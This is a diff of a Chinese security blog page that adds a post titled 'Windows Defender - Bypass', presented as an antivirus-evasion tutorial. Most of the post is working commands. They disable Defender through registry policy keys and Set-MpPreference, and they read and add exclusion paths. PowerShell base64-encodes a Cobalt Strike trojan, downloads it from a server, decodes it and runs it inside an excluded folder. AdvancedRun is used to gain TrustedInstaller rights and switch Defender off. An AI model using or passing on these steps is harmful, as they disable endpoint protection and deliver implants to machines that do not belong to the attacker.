@@ -24,7 +24,7 @@
 
   
 
-  <title>WsyKer&#39;s Blog</title>
+  <title>Windows Defender - Bypass | WsyKer&#39;s Blog</title>
 
   
 
@@ -45,7 +45,7 @@
   <div class="root-container">
     
 <!-- header container -->
-<header class="header-container">
+<header class="header-container post">
   
     <div class="post-image" style="background-image: url(https://wsyker.oss-cn-beijing.aliyuncs.com/img/blog/title.jpg)"></div>
   
@@ -95,48 +95,205 @@
 
   
   
-
-  
-  
     <div class="header-content">
-      <div class="post-text layout-block layout-padding">
-        <h1 class="title-wrap"></h1>
-        
+      <div class="post-text layout-block">
+        <div class="layout-margin">
+          <h1 class="title-wrap">Windows Defender - Bypass</h1>
+          <h2 class="title-sub-wrap">
+            <strong>WsyKer</strong>
+            <span>发布于</span>
+            <time  class="article-date" datetime="2022-07-09T17:36:54.000Z" itemprop="datePublished">2022-07-10</time>
+          </h2>
+          <ul class="wrap-list dark">
+  
+    <li><a href="/categories/%E6%9D%80%E8%BD%AF%E5%AF%B9%E6%8A%97/">📒 杀软对抗</a></li>
+  
+</ul>
+          <ul class="wrap-list dark">
+  
+    <li><a href="/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/">🏷️ 内网安全</a></li>
+  
+</ul>
+        </div>
       </div>
     </div>
+  
+
+  
   
   
 </header>
 
-    <!-- 分页(其他自定义页面) -->
+    <!-- 文章 -->
 
-<!-- 自定义页面 -->
-
+<!-- 文章内容 -->
 <div class="body-container">
   <article class="content-container layout-block post-container">
     <div class="article-info">
       
+      
+      
+      
       <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
-        <h3 id="🧐-我是WsyKer"><a href="#🧐-我是WsyKer" class="headerlink" title="🧐  我是WsyKer"></a>🧐  我是WsyKer</h3><pre><code>一个啥也不会的安服仔
-🌱 WEB狗
-⭐ 想学代码但始终学不会
-💬 联系方式： 2352815289@qq.com --大佬带带
-</code></pre>
-<h3 id="🛠-技术栈-Tech-Stack"><a href="#🛠-技术栈-Tech-Stack" class="headerlink" title="🛠  技术栈 | Tech Stack"></a>🛠  技术栈 | Tech Stack</h3><pre><code>💻   WEB安全
-🌐   内网渗透
-🔧   安全开发
-</code></pre>
-<h3 id="关于我"><a href="#关于我" class="headerlink" title="关于我"></a>关于我</h3><hr>
-<p>02年出生，身高刚好180cm，体重不过100kg，大专毕业不喜欢学习，喜欢玩游戏打篮球和啥也不干躺一天，最喜欢的游戏是OW1和NBA2K，篮球喜欢打的位置是控卫，有志同道合的小伙伴可以和我一起，期望早点转行🕓</p>
-<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/blog/baoqingbao2.gif" alt="biaoqingbao2"></p>
+        <h2 id="一、介绍"><a href="#一、介绍" class="headerlink" title="一、介绍"></a>一、介绍</h2><p>Windows Defender ，现名 Microsoft Defender，是一个运行在Windows上的杀毒软件，可以运行在 Windows XP 和 Windows Server 2003 操作系统上，并已内置在 Windows Vista ， Windows 7 ， Windows 8 ， Windows 8.1 ， Windows 10 和 Windows 11 中，Windows Defender 不像其他同类免费产品一样只能扫描系统，它还可以对系统进行实时监控。从 Windows 10 开始， Windows Defender 加入了右键扫描和离线杀毒，根据最新的每日样本测试，查杀率已经有了大的提升，达到国际一流水准。环境：Winodws10专业版</p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/defender/1.png" alt="1"></p>
+<h2 id="二、Bypass"><a href="#二、Bypass" class="headerlink" title="二、Bypass"></a>二、Bypass</h2><h3 id="注册表："><a href="#注册表：" class="headerlink" title="注册表："></a>注册表：</h3><p>微软为了提供用户更妥善的安全保护，在2020年8月更新中更新了支持文档。若用户安装了其他杀毒软件，Defender将自动关闭，那么这样的话，是不是可以伪造已安装其他杀毒软件的假象，从而绕过Defender呢，先来看一下没有安装过其他杀毒软件的Defender</p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/defender/2.png" alt="2"></p>
+<p>再来看一下安装过其他杀毒软件的</p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/defender/3.png" alt="3"></p>
+<p>Defender所在的注册表位为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Policy Manager</span><br></pre></td></tr></table></figure>
+
+<p>对两台Windows Defender运行时进行键值对比，发现键值DisableAntiSpyware和DisableAntiVirus，0代表启用Defender，1代表禁用Defender，使用管理权限的CMD对注册表进行修改：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKLM\SOFTWARE\Policies\Microsoft\Windows Defender&quot; /v DisableAntiSpyware /t reg_dword /d 1 /f</span><br><span class="line">reg add &quot;HKLM\SOFTWARE\Policies\Microsoft\Windows Defender&quot; /v DisableAntiVirus /t reg_dword /d 1 /f</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/defender/4.png" alt="4"></p>
+<p>随后重启电脑，查看Defender依然是开启状态，但是杀毒引擎已经失效，随便丢一个mimikatz上去，进行打开，成功绕过检测</p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/defender/5.png" alt="5"></p>
+<h3 id="排除项："><a href="#排除项：" class="headerlink" title="排除项："></a>排除项：</h3><p>在微软官方对Windows Defender的介绍中，有一篇名为在Windows server中配置Defender排除项的文章，其中详细介绍了Defender排除项的用处以及功能，如自定义排除项、退出排除项、自动排除项等</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/configure-server-exclusions-microsoft-defender-antivirus?view=o365-worldwide#list-of-automatic-exclusions</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/defender/6.png" alt="6"></p>
+<p>简单点来说，就是Windows Server 2016和2019中，会自动默认存在一些排除项，在实时检测过程中会忽略这些排除项，以下列举一些常见的排除项文件夹以及进程文件</p>
+<table>
+<thead>
+<tr>
+<th>路径</th>
+<th>用途</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>%SystemRoot%\IIS Temporary Compressed Files</td>
+<td>iis临时压缩文件夹</td>
+</tr>
+<tr>
+<td>%SystemDrive%\inetpub\temp\ASP Compiled Templates</td>
+<td>ASP编译模板文件夹</td>
+</tr>
+<tr>
+<td>%SystemDrive%\inetpub\logs</td>
+<td>日志文件夹</td>
+</tr>
+<tr>
+<td>%SystemDrive%\inetpub\wwwroot</td>
+<td>网站目录文佳佳</td>
+</tr>
+<tr>
+<td>%systemroot%\System32\dfsr.exe</td>
+<td>AD DS 相关支持</td>
+</tr>
+<tr>
+<td>%systemroot%\System32\dns.exe</td>
+<td>文件复制服务</td>
+</tr>
+<tr>
+<td>%SystemRoot%\system32\inetsrv\w3wp.exe</td>
+<td>WEB服务</td>
+</tr>
+<tr>
+<td>%SystemRoot%\SysWOW64\inetsrv\w3wp.exe</td>
+<td>WEB服务</td>
+</tr>
+<tr>
+<td>%SystemDrive%\PHP5433\php-cgi.exe</td>
+<td>php-cgi 服务</td>
+</tr>
+</tbody></table>
+<p>使用以下命令也可以从注册表中获取到一些排除项，如下就获取到了某个执行文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">查看白名单后缀：reg query  &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions&quot;</span><br><span class="line">查看白名单进程：reg query &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes&quot;</span><br><span class="line">查看白名单路径：reg query &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths&quot; </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/defender/7.png" alt="7"></p>
+<p>得到了上述的排除项后，使用Cobalt Strike生成木马，再使用Powershell进行编码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$PEBytes = [System.IO.File]::ReadAllBytes(&quot;hello.exe&quot;)</span><br><span class="line">$Base64Payload = [System.Convert]::ToBase64String($PEBytes)</span><br><span class="line">Set-Content hello_base64.txt -Value $Base64Payload</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/defender/8.png" alt="8"></p>
+<p>使用Cobalt Strike将生成好的文件挂载到服务器上，方便接下来进行下载</p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/defender/9.png" alt="9"></p>
+<p>然后打开DOS窗口，下载文件到本地</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -Command $clnt = new-object System.Net.WebClient;$url= &#x27;http://127.0.0.1/hello_base64.txt&#x27;;$file = &#x27; C:\Program Files (x86)\hello_base64.txt &#x27;;$clnt.DownloadFile($url,$file);</span><br></pre></td></tr></table></figure>
+
+<p>对其进行解码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$Base64Bytes = Get-Content (&quot;hello_base64.txt&quot;)</span><br><span class="line">$PEBytes= [System.Convert]::FromBase64String($Base64Bytes)</span><br><span class="line">[System.IO.File]::WriteAllBytes(&quot;hello.exe&quot;,$PEBytes)</span><br></pre></td></tr></table></figure>
+
+<p>然后直接执行即可绕过Defender进行上线，当然也可以不进行编码，直接挂载木马到网站上进行下载上线</p>
+<p>最后，这种绕过Defender的手段并不完整，官网文档中也指出了，Defender主动扫描的时候依旧会扫描排除项</p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/defender/10.png" alt="10"></p>
+<h3 id="Powershell："><a href="#Powershell：" class="headerlink" title="Powershell："></a>Powershell：</h3><p>Windows官方，明确指出了可以使用Powershell对Defender进行管理，如检查Microsoft Defender的状态</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell Get-MpComputerStatus</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/defender/11.png" alt="11"></p>
+<p>那么照样也可以使用Powershell关闭Defender，使用管理员权限打开Powershell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$preferences = Get-MpPreference</span><br><span class="line">Set-MpPreference -DisableRealtimeMonitoring (!$preferences.DisableRealtimeMonitoring)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/defender/12.png" alt="12"></p>
+<p>使用此方法添加排除项也是没问题的，在Defender开启的时候执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -ExecutionPolicy Bypass Add-MpPreference -ExclusionPath &quot;C:\test&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/defender/13.png" alt="13"></p>
+<h3 id="TrustedInstaller："><a href="#TrustedInstaller：" class="headerlink" title="TrustedInstaller："></a>TrustedInstaller：</h3><p>在Windows XP及以前，System账户与管理员组对系统文件都有着完全访问的权限。 [3]  这意味着以管理员身份运行的程序可以任意更改系统，降低了系统安全性。TrustedInstaller则改变了这一情况，使得只有拥有TrustedInstaller令牌的系统进程才能更改系统重要内容，而其他大部分系统服务就没有权限。 [4]  这是因为，以SYSTEM权限运行的程序不一定同时拥有TrustedInstaller的权限，只有通过了Service Control Manager（服务启动控制器）的验证后才能获取。简单点来说，用户获取到TrustedInstaller权限后，也可以关闭Defender</p>
+<p>工具介绍：AdvancedRun</p>
+<p>AdvancedRun 是一款适用于 Windows 的简单工具，可让您以您选择的不同设置运行程序，包括 - 低优先级或高优先级、启动目录、主窗口状态（最小化&#x2F;最大化）、以不同用户或权限运行程序、操作系统兼容性设置， 和环境变量。 您还可以将所需的设置保存到配置文件中，然后使用所需的设置从命令行自动运行程序。 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">下载地址：https://www.nirsoft.net/utils/advanced_run.html</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/defender/14.png" alt="14"></p>
+<ol>
+<li>第一步使用正常权限的System权限关闭Defender</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows Defender&quot; /v DisableAntiSpyware /t reg_dword /d 1 /f</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/defender/15.png" alt="15"></p>
+<ol start="2">
+<li>AdvancedRun启动CMD，命令：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdvancedRun.exe /EXEFilename &quot;c:\windows\system32\cmd.exe&quot; /RunAs 8 /Run</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>这时启动的CMD即为TrustedInstaller权限，可以使用whoami &#x2F;priv做个对比</li>
+</ol>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/defender/16.png" alt="16"></p>
+<ol start="4">
+<li>用TrustedInstaller权限的CMD关闭Defender</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">关闭Defender：reg add &quot;HKLM\SOFTWARE\Microsoft\Windows Defender&quot; /v DisableAntiSpyware /t reg_dword /d 1 /f</span><br><span class="line">一句话完成：AdvancedRun.exe /EXEFilename &quot;c:\windows\system32\cmd.exe&quot; /CommandLine &#x27;&quot;cmd /c reg add &quot;HKLM\SOFTWARE\Microsoft\Windows Defender&quot;/v DisableAntiSpyware /t reg_dword /d 1 /f&quot;&#x27; /RunAs 8 /Run</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/defender/17.png" alt="17"></p>
 
       </section>
 
       
       
+        <nav class="article-nav">
+          
+          
+            <div class="article-nav-item layout-padding">
+  <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
+    
+    <div class="card-text">
+      
+        <a href="/2022/07/08/uac/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">Windows UAC - Bypass</h2>
+        </a>
+      
+      <div class="card-text--row">Older</div>
+    </div>
+  </article>
+</div>
+          
+        </nav>
+      
 
-      
-      
+      <section class="page-message-container layout-padding">
+        
+
+
+  
+  
+
+  
+  
+
+
+      </section>
     </div>
     <div class="widget-info">
       <section class="widget-author widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
@@ -173,6 +330,8 @@
     </div>
   </div>
 </section>
+
+      
 
       
 <section class="widet-notice widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
@@ -248,7 +407,6 @@
     </div>
   </article>
 </div>
-
 
     <!-- footer container -->
 <footer id="footer" class="footer">
